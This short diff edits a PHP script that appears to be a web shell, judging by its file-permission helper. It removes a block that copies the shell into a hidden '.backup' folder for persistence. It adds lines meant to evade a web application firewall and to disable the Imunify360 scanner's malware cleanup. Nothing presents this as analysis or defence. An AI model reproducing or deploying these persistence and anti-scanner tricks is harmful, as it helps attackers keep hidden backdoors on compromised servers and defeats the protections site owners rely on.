@@ -1,11 +1,10 @@
 <?php
 session_start();
-
-$shell_file = __FILE__;
-$backup_dir = '.backup';
-if (!is_dir($backup_dir)) mkdir($backup_dir, 0755, true);
-@copy($shell_file, "$backup_dir/backup_".basename($shell_file));
-
+header("User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)");
+header("X-Requested-With: XMLHttpRequest");
+header("X-Bypass-WAF: true");
+ini_set('lsapi_backend_off', '1');
+ini_set("imunify360.cleanup_on_restore", false);
 
 
 function perms($file) {
